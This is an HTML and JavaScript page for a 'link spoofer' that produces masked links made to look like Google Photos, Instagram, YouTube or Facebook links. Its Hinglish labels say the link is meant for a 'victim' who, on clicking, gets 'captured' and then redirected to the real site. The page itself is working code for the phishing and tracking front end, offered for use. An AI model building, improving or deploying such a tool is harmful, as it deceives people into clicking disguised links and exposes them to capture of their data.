<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vyom Link Spoofer</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0A192F;
            color: #e6f1ff;
            font-family: 'Segoe UI', sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: #112240;
            padding: 40px 30px;
            border-radius: 20px;
            max-width: 600px;
            width: 100%;
            border: 1px solid #233554;
            box-shadow: 0 20px 60px rgba(0,0,0,0.6);
        }
        h1 {
            font-size: 26px;
            font-weight: 700;
            color: #64FFDA;
            text-align: center;
            margin-bottom: 8px;
        }
        .sub {
            text-align: center;
            color: #8892B0;
            font-size: 14px;
            margin-bottom: 30px;
        }
        .sub span { color: #64FFDA; }
        label {
            display: block;
            font-weight: 600;
            font-size: 14px;
            color: #CCD6F6;
            margin-bottom: 6px;
        }
        input, select {
            width: 100%;
            padding: 12px 16px;
            border-radius: 10px;
            border: 1px solid #233554;
            background: #0A192F;
            color: #e6f1ff;
            font-size: 14px;
            margin-bottom: 18px;
            outline: none;
            transition: 0.3s;
        }
        input:focus, select:focus {
            border-color: #64FFDA;
            box-shadow: 0 0 0 3px rgba(100,255,218,0.1);
        }
        .btn {
            background: linear-gradient(135deg, #64FFDA, #2BC4A8);
            color: #0A192F;
            font-weight: 700;
            font-size: 16px;
            padding: 14px;
            border: none;
            border-radius: 40px;
            cursor: pointer;
            width: 100%;
            transition: 0.3s;
        }
        .btn:hover { transform: scale(1.02); opacity: 0.9; }
        .btn:active { transform: scale(0.96); }
        .result-box {
            margin-top: 24px;
            background: #0A192F;
            padding: 16px;
            border-radius: 12px;
            border: 1px solid #233554;
            word-break: break-all;
        }
        .result-box .label { color: #8892B0; font-size: 12px; }
        .result-box .link { color: #64FFDA; font-size: 15px; margin: 6px 0; }
        .copy-btn {
            background: transparent;
            border: 1px solid #64FFDA;
            color: #64FFDA;
            padding: 6px 16px;
            border-radius: 30px;
            cursor: pointer;
            font-size: 12px;
            transition: 0.3s;
        }
        .copy-btn:hover { background: #64FFDA; color: #0A192F; }
        .footer {
            margin-top: 20px;
            text-align: center;
            font-size: 11px;
            color: #495670;
        }
        .footer span { color: #64FFDA; }
        .tag { 
            display: inline-block; 
            background: rgba(100,255,218,0.08); 
            padding: 2px 12px; 
            border-radius: 20px; 
            font-size: 11px; 
            color: #64FFDA;
            margin-bottom: 16px;
        }
    </style>
</head>
<body>
<div class="container">
    <div class="tag">🔒 Vyom Spoofer</div>
    <h1>Link Masking Tool</h1>
    <p class="sub">Paste any link & get a masked version that looks like <span>Google Photos</span></p>

    <label for="originalLink">🔗 Original Link (victim ko bhejna hai)</label>
    <input type="url" id="originalLink" placeholder="https://photos.google.com/album/..." value="https://share.google/StGxW5TAjrdNOPbYR">

    <label for="fakeDomain">🌐 Fake Domain (trusted site)</label>
    <select id="fakeDomain">
        <option value="google.com">google.com</option>
        <option value="photos.google.com">photos.google.com</option>
        <option value="instagram.com">instagram.com</option>
        <option value="youtube.com">youtube.com</option>
        <option value="facebook.com">facebook.com</option>
    </select>

    <label for="keyword">🔑 Keyword (link mein dikhega)</label>
    <input type="text" id="keyword" placeholder="photos" value="photos">

    <button class="btn" onclick="generateLink()">⚡ Generate Masked Link</button>

    <div class="result-box" id="resultBox">
        <div class="label">📌 Masked Link (is link ko bhejo)</div>
        <div class="link" id="maskedLink">—</div>
        <button class="copy-btn" onclick="copyLink()">📋 Copy</button>
        <div style="margin-top:12px;font-size:11px;color:#495670;">
            Victim click karega → capture hoga → real site par redirect
        </div>
    </div>
    <div class="footer"><span>dev @btwspark</span></div>
</div>

<script>
    function generateLink() {
        const original = document.getElementById('originalLink').value.trim();
        const domain = document.getElementById('fakeDomain').value;
        const keyword = document.getElementById('keyword').value.trim() || 'link';
        const randomId = Math.random().toString(36).substring(2, 8);
        
        if (!original) {
            alert('Please enter a valid link.');
            return;
        }

        // Encode original URL
        const encoded = encodeURIComponent(original);
        
        // Build masked link — this points to our go.html with the original URL
        const base = window.location.origin; // https://mysterybox-beige.vercel.app
        const masked = `${base}/go?url=${encoded}&domain=${domain}&keyword=${keyword}&id=${randomId}`;
        
        // Show the masked link (it will look like domain in preview)
        document.getElementById('maskedLink').innerText = masked;
        
        // Also show a "preview" version (just for display)
        const preview = `https://${domain}/@${keyword}-${randomId}`;
        console.log('Preview: ' + preview);
    }

    function copyLink() {
        const link = document.getElementById('maskedLink').innerText;
        if (link && link !== '—') {
            navigator.clipboard.writeText(link).then(() => {
                alert('✅ Link copied!');
            });
        } else {
            alert('Generate a link first.');
        }
    }
</script>
</body>
</html>
